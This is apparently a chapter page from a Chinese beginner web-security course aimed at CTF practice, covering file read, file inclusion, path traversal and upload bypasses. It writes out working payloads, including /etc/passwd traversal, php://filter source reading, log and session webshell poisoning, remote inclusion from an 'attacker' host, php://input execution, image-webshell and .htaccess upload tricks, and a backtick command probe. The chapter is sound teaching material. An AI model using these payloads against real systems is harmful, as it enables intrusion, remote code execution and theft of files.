@@ -1,0 +1,121 @@
+<!DOCTYPE html>
+<html lang="zh-CN"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1"><title>文件类漏洞：读取、包含、上传、穿越 · 从零学网安</title><link rel="stylesheet" href="assets/style.css"><style>.top .btn.bk{color:#e7b98a;border-color:rgba(231,185,138,.55);margin-right:6px;text-decoration:none}.top .btn.bk:hover{color:#fff;border-color:#ff8b6b}</style></head><body><div class="top"><a class="btn bk" href="#" id="bg5fnhBack" title="回到网站">← 返回</a><div class="brand">从零学网安 <small>从 Linux 与网站运行原理，到用妮露工具箱做出一道题</small></div><div class="grow"></div><input id="q" type="search" placeholder="搜：SQL 注入 / session / 端口 …"><a class="btn" href="index.html">目录</a><div id="hits"></div></div><div class="wrap"><aside class='side'><h4>章节</h4><a href='ch00.html'>00　学习地图：这门课到底在教你什么</a><a href='ch01.html'>01　一次访问的全过程（从按下回车到看见页面）</a><a href='ch02.html'>02　Linux 最小必要：文件、权限、进程、命令</a><a href='ch03.html'>03　网站是怎么跑起来的（Nginx 与后端的分工）</a><a href='ch04.html'>04　读得懂代码：PHP / Python / JS 的最小语法对照</a><a href='ch05.html'>05　输入从哪来：参数、头、Cookie、文件、JSON</a><a href='ch06.html'>06　数据库与 SQL 注入：数据变成语法的瞬间</a><a href='ch07.html'>07　认证与会话：我是谁，以及我怎么证明</a><a class='on' href='ch08.html'>08　文件类漏洞：读取、包含、上传、穿越</a><a href='ch09.html'>09　执行类与借刀类：命令、模板、反序列化、SSRF、XXE</a><a href='ch10.html'>10　信息收集：把「一个网址」变成「一张清单」</a><a href='ch11.html'>11　用妮露工具箱实战：面板、洪水、信息显示</a><a href='ch12.html'>12　十二道渐进练习：从「看页面」到「打完整链」</a><a href='ch13.html'>13　进阶：代理层、协议层与「看不见的」漏洞</a><a href='ch14.html'>14　附录：工具箱全表（面板 · 策略 · 判据）</a><h4>附录</h4><a href='glossary.html'>术语总表</a><h4>本页</h4><a href='#s1'>四个词的区别（新手最容易糊成一团）</a><a href='#s2'>文件包含的四条路线</a><a href='#s3'>上传绕过的五种思路</a><a href='#s4'>怎么验证&quot;我这个文件真的被执行了&quot;</a><a href='#s5'>本章小结</a></aside><main>
+<h1>第 08 章　文件类漏洞：读取、包含、上传、穿越</h1><p class='lead'>文件是 Linux 上最有威力的东西。这一章把「路径可控」的四种后果讲清楚，并给出每种的最小验证方法。</p>
+<div class="goals"><h4>本章你会得到</h4>
+<ul>
+<li>四个概念的区分：<a class='gl' data-k='50' href='glossary.html#t-50' title='点一下看解释（Esc 关闭）'>任意文件读取</a> / <a class='gl' data-k='48' href='glossary.html#t-48' title='点一下看解释（Esc 关闭）'>文件包含</a> / <a class='gl' data-k='49' href='glossary.html#t-49' title='点一下看解释（Esc 关闭）'>路径穿越</a> / <a class='gl' data-k='52' href='glossary.html#t-52' title='点一下看解释（Esc 关闭）'>文件上传</a></li>
+<li><a class='gl' data-k='48' href='glossary.html#t-48' title='点一下看解释（Esc 关闭）'>文件包含</a>的四条"武器化"路线（读文件、读源码、执行代码、远程包含）</li>
+<li>上传绕过的五种思路，以及"<a class='gl' data-k='54' href='glossary.html#t-54' title='点一下看解释（Esc 关闭）'>条件竞争</a>"为什么存在</li>
+</ul></div>
+
+<h2 id='s1'>四个词的区别（新手最容易糊成一团）</h2>
+
+<table>
+<tr><th>名字</th><th>代码长什么样</th><th>你能做什么</th></tr>
+<tr><td><a class='gl' data-k='50' href='glossary.html#t-50' title='点一下看解释（Esc 关闭）'>任意文件读取</a></td><td><code>echo file_get_contents($f);</code></td><td>读文件内容（含源码/配置/密钥）</td></tr>
+<tr><td>文件包含</td><td><code>include($f);</code></td><td><b>执行</b>被包含文件里的 PHP 代码</td></tr>
+<tr><td><a class='gl' data-k='49' href='glossary.html#t-49' title='点一下看解释（Esc 关闭）'>路径穿越</a></td><td>任何拼路径的地方 + <code>../</code></td><td>跳出限定目录（"只能读 uploads/"变成"能读全盘"）</td></tr>
+<tr><td><a class='gl' data-k='52' href='glossary.html#t-52' title='点一下看解释（Esc 关闭）'>文件上传</a></td><td><code>move_uploaded_file($_FILES...)</code></td><td>把内容写到服务器磁盘上（配合上面三个用）</td></tr>
+</table>
+
+<div class="why"><span class="t">为什么"包含"比"读取"危险一个数量级</span>
+<p>读取只能看，包含会<b>执行</b>。所以一个包含<a class='gl' data-k='40' href='glossary.html#t-40' title='点一下看解释（Esc 关闭）'>漏洞</a> + 一个"我能写进去的文件" = 完整的命令执行。
+这也是为什么"<a class='gl' data-k='20' href='glossary.html#t-20' title='点一下看解释（Esc 关闭）'>日志</a>投毒 / session 写马 / 上传 + 包含"总是一起出现：它们在凑这个组合。</p></div>
+
+<figure><svg viewBox="0 0 960 280" xmlns="http://www.w3.org/2000/svg" role="img"><text x="480.0" y="30.0" fill="#ffd9a8" font-size="14.0" font-family="Microsoft YaHei UI, Segoe UI, PingFang SC, sans-serif" font-weight="700" text-anchor="middle" opacity="1.00">include($_GET['f']) —— 用户决定了「包含哪个文件」</text><rect x="30.0" y="60.0" width="180.0" height="70.0" rx="10" fill="#23322b" stroke="#4fa87a" stroke-width="1.4" opacity="1.00"/><text x="120.0" y="93.0" fill="#ffffff" font-size="13.5" font-family="Microsoft YaHei UI, Segoe UI, PingFang SC, sans-serif" font-weight="600" text-anchor="middle" opacity="1.00">用户</text><text x="120.0" y="109.5" fill="#a49795" font-size="11.5" font-family="Microsoft YaHei UI, Segoe UI, PingFang SC, sans-serif" font-weight="400" text-anchor="middle" opacity="1.00">f=../../etc/passwd</text><rect x="260.0" y="60.0" width="220.0" height="70.0" rx="10" fill="#3a2a1f" stroke="#e0a03a" stroke-width="1.4" opacity="1.00"/><text x="370.0" y="93.0" fill="#ffffff" font-size="13.5" font-family="Microsoft YaHei UI, Segoe UI, PingFang SC, sans-serif" font-weight="600" text-anchor="middle" opacity="1.00">应用</text><text x="370.0" y="109.5" fill="#a49795" font-size="11.5" font-family="Microsoft YaHei UI, Segoe UI, PingFang SC, sans-serif" font-weight="400" text-anchor="middle" opacity="1.00">include($f);</text><rect x="530.0" y="60.0" width="180.0" height="70.0" rx="10" fill="#2a2a2a" stroke="#7d6f6d" stroke-width="1.4" opacity="1.00"/><text x="620.0" y="93.0" fill="#ffffff" font-size="13.5" font-family="Microsoft YaHei UI, Segoe UI, PingFang SC, sans-serif" font-weight="600" text-anchor="middle" opacity="1.00">文件系统</text><text x="620.0" y="109.5" fill="#a49795" font-size="11.5" font-family="Microsoft YaHei UI, Segoe UI, PingFang SC, sans-serif" font-weight="400" text-anchor="middle" opacity="1.00">打开那个路径</text><g><line x1="210.0" y1="95.0" x2="251.0" y2="95.0" stroke="#4fa87a" stroke-width="1.8"/><polygon points="258.0,95.0 251.9,98.5 251.9,91.5" fill="#4fa87a"/></g><g><line x1="480.0" y1="95.0" x2="521.0" y2="95.0" stroke="#e0a03a" stroke-width="1.8"/><polygon points="528.0,95.0 521.9,98.5 521.9,91.5" fill="#e0a03a"/></g><rect x="760.0" y="60.0" width="170.0" height="70.0" rx="10" fill="#2d2438" stroke="#9a6bb5" stroke-width="1.4" opacity="1.00"/><text x="845.0" y="93.0" fill="#ffffff" font-size="13.5" font-family="Microsoft YaHei UI, Segoe UI, PingFang SC, sans-serif" font-weight="600" text-anchor="middle" opacity="1.00">输出</text><text x="845.0" y="109.5" fill="#a49795" font-size="11.5" font-family="Microsoft YaHei UI, Segoe UI, PingFang SC, sans-serif" font-weight="400" text-anchor="middle" opacity="1.00">文件内容进页面</text><g><line x1="710.0" y1="95.0" x2="751.0" y2="95.0" stroke="#9a6bb5" stroke-width="1.8"/><polygon points="758.0,95.0 751.9,98.5 751.9,91.5" fill="#9a6bb5"/></g><rect x="30.0" y="156.0" width="900.0" height="104.0" rx="10" fill="#1b1514" stroke="#3a2a2a" stroke-width="1.4" opacity="1.00"/><text x="44.0" y="180.0" fill="#ffce7a" font-size="12.5" font-family="Microsoft YaHei UI, Segoe UI, PingFang SC, sans-serif" font-weight="700" text-anchor="start" opacity="1.00">同一条路，四种玩法：</text><text x="196.0" y="180.0" fill="#c9b6b2" font-size="12.5" font-family="Microsoft YaHei UI, Segoe UI, PingFang SC, sans-serif" font-weight="400" text-anchor="start" opacity="1.00">① 读文件（../ 穿越、/etc/passwd） ② 读源码（php://filter 把 .php 当 base64 读出来）</text><text x="196.0" y="204.0" fill="#c9b6b2" font-size="12.5" font-family="Microsoft YaHei UI, Segoe UI, PingFang SC, sans-serif" font-weight="400" text-anchor="start" opacity="1.00">③ 执行代码（包含我们写得进去的文件：<a class='gl' data-k='20' href='glossary.html#t-20' title='点一下看解释（Esc 关闭）'>日志</a>、session、上传、pearcmd 写出的 <a class='gl' data-k='53' href='glossary.html#t-53' title='点一下看解释（Esc 关闭）'>webshell</a>）</text><text x="196.0" y="228.0" fill="#c9b6b2" font-size="12.5" font-family="Microsoft YaHei UI, Segoe UI, PingFang SC, sans-serif" font-weight="400" text-anchor="start" opacity="1.00">④ 直接远程包含（allow_url_include=On 时 include http://…）</text></svg><figcaption>图 6-1　文件包含：路径可控，后果取决于「被包含的东西是什么」</figcaption></figure>
+
+<h2 id='s2'>文件包含的四条路线</h2>
+
+<h3>① 直接读文件（最简单）</h3>
+<pre class="term"><code>?file=../../../../etc/passwd
+?file=/proc/self/cmdline        # 看进程启动参数，有时能看出跑的是什么</code></pre>
+
+<h3>② 读源码（看起来"读到了"，其实是空的）</h3>
+<p>直接 <code>?file=index.php</code> 会<b>执行</b>它，页面是渲染结果，不是源码。
+要读源码必须套"过滤器"把它变成纯文本：</p>
+<pre class="term"><code>?file=php://filter/convert.base64-encode/resource=index.php
+# 拿到 base64 → 解码 → 就是源码</code></pre>
+
+<h3>③ 包含"我能写进去的文件"（getshell）</h3>
+<table>
+<tr><th>可写位置</th><th>怎么把代码写进去</th><th>注意</th></tr>
+<tr><td>访问日志</td><td>把 <code>&lt;?php ... ?&gt;</code> 放进 User-Agent，再包含 access.log</td>
+    <td>日志路径常被过滤（<code>log</code> 关键字）</td></tr>
+<tr><td>session 文件</td><td>让应用把输入存进 session（或 <code>session.upload_progress</code>）</td>
+    <td>路径 <code>/tmp/sess_&lt;sid&gt;</code> 含 <code>tmp</code> 时可能被挡</td></tr>
+<tr><td>上传的文件</td><td>先上传一个"图片马"，再包含它</td><td>要绕过后缀/内容校验</td></tr>
+<tr><td>PEAR 的命令行脚本</td><td>include <code>pearcmd.php</code>，用 <code>config-create</code> 写文件</td>
+    <td>要求 <code>register_argc_argv=On</code></td></tr>
+</table>
+
+<h3>④ 远程包含 / 伪协议</h3>
+<pre class="term"><code>?file=http://attacker/shell.txt      # allow_url_include=On 才行
+?file=data://text/plain,&lt;?php ...    # 同上；常被 "data" 关键字挡
+?file=php://input                     # 把 POST body 当代码（allow_url_include 也要开）</code></pre>
+
+<div class="warn"><span class="t">真实题目里最常见的坑：黑名单只拦小写</span>
+<p>比如过滤写的是 <code>preg_match('/data|php|tmp|log/', $f)</code>，<b>没有 /i</b>。
+那么 <code>PHP://INPUT</code>、<code>DATA://</code> 全都能过，因为 PHP 的包装器名<b>不区分大小写</b>。
+（这条是真实比赛里打出来的，见工具箱开发文档 §206。）</p></div>
+
+<figure><svg viewBox="0 0 960 300" xmlns="http://www.w3.org/2000/svg" role="img"><text x="480.0" y="28.0" fill="#ffd9a8" font-size="14.0" font-family="Microsoft YaHei UI, Segoe UI, PingFang SC, sans-serif" font-weight="700" text-anchor="middle" opacity="1.00">上传一个文件，服务器会经过三道关</text><rect x="40.0" y="56.0" width="250.0" height="78.0" rx="10" fill="#3a2a1f" stroke="#e0a03a" stroke-width="1.4" opacity="1.00"/><text x="165.0" y="93.0" fill="#ffffff" font-size="13.5" font-family="Microsoft YaHei UI, Segoe UI, PingFang SC, sans-serif" font-weight="600" text-anchor="middle" opacity="1.00">① 收包</text><text x="165.0" y="109.5" fill="#a49795" font-size="11.5" font-family="Microsoft YaHei UI, Segoe UI, PingFang SC, sans-serif" font-weight="400" text-anchor="middle" opacity="1.00">临时目录</text><text x="165.0" y="150.0" fill="#7d6f6d" font-size="11.5" font-family="Microsoft YaHei UI, Segoe UI, PingFang SC, sans-serif" font-weight="400" text-anchor="middle" opacity="1.00">文件名/类型都由客户端说</text><rect x="340.0" y="56.0" width="250.0" height="78.0" rx="10" fill="#3a2a1f" stroke="#e0a03a" stroke-width="1.4" opacity="1.00"/><text x="465.0" y="93.0" fill="#ffffff" font-size="13.5" font-family="Microsoft YaHei UI, Segoe UI, PingFang SC, sans-serif" font-weight="600" text-anchor="middle" opacity="1.00">② 校验</text><text x="465.0" y="109.5" fill="#a49795" font-size="11.5" font-family="Microsoft YaHei UI, Segoe UI, PingFang SC, sans-serif" font-weight="400" text-anchor="middle" opacity="1.00">白名单/魔数/大小</text><text x="465.0" y="150.0" fill="#7d6f6d" font-size="11.5" font-family="Microsoft YaHei UI, Segoe UI, PingFang SC, sans-serif" font-weight="400" text-anchor="middle" opacity="1.00">不合格就删</text><rect x="640.0" y="56.0" width="250.0" height="78.0" rx="10" fill="#3a2a1f" stroke="#e0a03a" stroke-width="1.4" opacity="1.00"/><text x="765.0" y="93.0" fill="#ffffff" font-size="13.5" font-family="Microsoft YaHei UI, Segoe UI, PingFang SC, sans-serif" font-weight="600" text-anchor="middle" opacity="1.00">③ 落盘</text><text x="765.0" y="109.5" fill="#a49795" font-size="11.5" font-family="Microsoft YaHei UI, Segoe UI, PingFang SC, sans-serif" font-weight="400" text-anchor="middle" opacity="1.00">web 目录?</text><text x="765.0" y="150.0" fill="#7d6f6d" font-size="11.5" font-family="Microsoft YaHei UI, Segoe UI, PingFang SC, sans-serif" font-weight="400" text-anchor="middle" opacity="1.00">能被当成代码执行吗</text><g><line x1="292.0" y1="95.0" x2="331.0" y2="95.0" stroke="#6b5550" stroke-width="1.8"/><polygon points="338.0,95.0 331.9,98.5 331.9,91.5" fill="#6b5550"/></g><g><line x1="592.0" y1="95.0" x2="631.0" y2="95.0" stroke="#6b5550" stroke-width="1.8"/><polygon points="638.0,95.0 631.9,98.5 631.9,91.5" fill="#6b5550"/></g><rect x="40.0" y="176.0" width="880.0" height="96.0" rx="10" fill="#1b1514" stroke="#3a2a2a" stroke-width="1.4" opacity="1.00"/><text x="54.0" y="200.0" fill="#ffce7a" font-size="12.5" font-family="Microsoft YaHei UI, Segoe UI, PingFang SC, sans-serif" font-weight="700" text-anchor="start" opacity="1.00">三种常见破法：</text><text x="180.0" y="200.0" fill="#c9b6b2" font-size="12.5" font-family="Microsoft YaHei UI, Segoe UI, PingFang SC, sans-serif" font-weight="400" text-anchor="start" opacity="1.00">① 校验只看后缀 → 传 shell.php.jpg / shell.pHp / shell.php%00.jpg</text><text x="180.0" y="224.0" fill="#c9b6b2" font-size="12.5" font-family="Microsoft YaHei UI, Segoe UI, PingFang SC, sans-serif" font-weight="400" text-anchor="start" opacity="1.00">② 落盘目录可执行 → 配合 .htaccess / .user.ini 让 .jpg 也当 PHP 跑</text><text x="180.0" y="248.0" fill="#c9b6b2" font-size="12.5" font-family="Microsoft YaHei UI, Segoe UI, PingFang SC, sans-serif" font-weight="400" text-anchor="start" opacity="1.00">③ 校验在落盘之后 → <a class='gl' data-k='54' href='glossary.html#t-54' title='点一下看解释（Esc 关闭）'>条件竞争</a>：一边传一边请求，抢「校验前」那一瞬间执行（第 12 章）</text></svg><figcaption>图 7-1　文件上传：收包 → 校验 → 落盘</figcaption></figure>
+
+<h2 id='s3'>上传绕过的五种思路</h2>
+
+<table>
+<tr><th>校验方式</th><th>绕过思路</th><th>例子</th></tr>
+<tr><td>只看后缀名</td><td>换等价后缀 / 双后缀 / 大小写</td><td><code>shell.php5</code>、<code>x.php.jpg</code>、<code>x.pHp</code></td></tr>
+<tr><td>只看 Content-Type</td><td>改<a class='gl' data-k='8' href='glossary.html#t-8' title='点一下看解释（Esc 关闭）'>请求头</a></td><td><code>image/png</code> 但内容是 PHP</td></tr>
+<tr><td>看文件头（魔数）</td><td>图片马：真图片 + 尾部塞 PHP</td><td><code>GIF89a&lt;?php ...</code></td></tr>
+<tr><td>重命名/随机名</td><td>让他告诉你名字（响应/页面）</td><td>再从响应里读回文件名</td></tr>
+<tr><td>落盘后校验再删</td><td>条件竞争（边传边请求）</td><td>抢"删之前"执行</td></tr>
+</table>
+
+<div class="why"><span class="t">为什么"图片马"要配"包含"或".htaccess"</span>
+<p>因为图片后缀不会被当成脚本执行。要么让包含<a class='gl' data-k='40' href='glossary.html#t-40' title='点一下看解释（Esc 关闭）'>漏洞</a>去 include 它，
+要么上传 <code>.htaccess</code> / <code>.user.ini</code> 改变"什么后缀当脚本"的规则。
+单独一个图片马，什么也不会发生 —— 这是新手最常误判的地方。</p></div>
+
+<h2 id='s4'>怎么验证"我这个文件真的被执行了"</h2>
+
+<p>不要用读 flag 当第一发。先用<b>无副作用、能算出结果</b>的小 payload：</p>
+
+<pre class="term"><code>&lt;?php echo 7*7; ?&gt;        → 页面出现 49，说明真的在跑 PHP
+&lt;?php phpinfo(); ?&gt;        → 看到 phpinfo 页，说明环境信息全暴露
+&lt;?=`id`?&gt;                  → 反引号执行命令，返回 uid=33(www-data)</code></pre>
+
+<div class="tool"><span class="t">工具箱里对应什么</span>
+<p><code>lfi</code>（包含/穿越）、<code>php_filter_chain</code>（过滤器链读源码）、
+<code>session_include</code>（session 写马）、<code>session_upload</code>（upload_progress）、
+<code>pear_lfi</code>（pearcmd 写文件）、<code>logpoison</code>（日志投毒）、
+<code>upload</code>/<code>upload_race</code>/<code>upload_include</code>（上传三态）、
+<code>phar_deser</code>（phar <a class='gl' data-k='36' href='glossary.html#t-36' title='点一下看解释（Esc 关闭）'>反序列化</a>）、<code>zip_slip</code>（压缩包路径穿越）。</p></div>
+
+<h2 id='s5'>本章小结</h2>
+
+<table>
+<tr><th>要点</th><th>一句话</th></tr>
+<tr><td>读 ≠ 包含</td><td>包含会执行，所以更值钱</td></tr>
+<tr><td>读源码要套 filter</td><td>直接包含 .php 看到的是输出，不是代码</td></tr>
+<tr><td>getshell 的公式</td><td>包含点 + 一个能写进去的文件</td></tr>
+<tr><td>上传要配执行条件</td><td>后缀/配置/包含，三者缺一不可</td></tr>
+</table>
+
+<div class='pager'><a class='l' href='ch07.html'>← 07　认证与会话：我是谁，以及我怎么证明</a><a class='r' href='ch09.html'>09　执行类与借刀类：命令、模板、反序列化、SSRF、XXE →</a></div></main></div><script src="assets/terms.js"></script><script src="assets/site.js"></script><script>
+(function () {
+  var b = document.getElementById("bg5fnhBack");
+  if (!b) return;
+  b.addEventListener("click", function (e) {
+    e.preventDefault();
+    try {
+      if (window.parent !== window) {
+        window.parent.postMessage({ type: "BG5FNH_CLOSE_OVERLAY" }, "*");
+        return;
+      }
+    } catch (err) {}
+    var m = /Android|iPhone|iPad|iPod|Mobile/i.test(navigator.userAgent || "");
+    window.location.href = "../../../../../" + (m ? "mobile/index_m.html" : "pc/index.html");
+  });
+})();
+</script>
+</body></html>
